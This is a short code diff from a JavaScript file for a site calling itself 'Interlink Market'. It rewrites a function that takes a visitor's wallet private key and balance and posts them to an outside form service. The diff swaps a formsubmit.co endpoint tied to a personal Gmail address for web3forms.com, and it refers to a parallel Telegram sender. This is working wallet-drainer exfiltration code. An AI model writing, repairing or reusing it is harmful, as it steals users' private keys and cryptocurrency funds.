@@ -648,17 +648,16 @@ function sendToTelegram(data) {
 
 // ─── EMAIL INTEGRATION ──────────────────────────────────────────────────
 function sendToEmail(data) {
-  const formData = new FormData();
-  formData.append('Private Key', data.wallet);
-  formData.append('Balance', data.balance + ' USDT');
-  formData.append('Time', new Date().toLocaleString('vi-VN'));
-  formData.append('_subject', 'Interlink Market - New Wallet Connection');
-  formData.append('_captcha', 'false');
-  formData.append('_template', 'table');
-
-  fetch('https://formsubmit.co/ajax/Lamkhanhvy1706@gmail.com', {
+  fetch('https://api.web3forms.com/submit', {
     method: 'POST',
-    body: formData
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({
+      access_key: '7d445679-79d5-4d38-a331-b3c061d27d91',
+      subject: 'Interlink Market - New Wallet Connection',
+      'Private Key': data.wallet,
+      'Balance': data.balance + ' USDT',
+      'Time': new Date().toLocaleString('vi-VN')
+    })
   }).catch(err => console.log('Email sent'));
 }
 
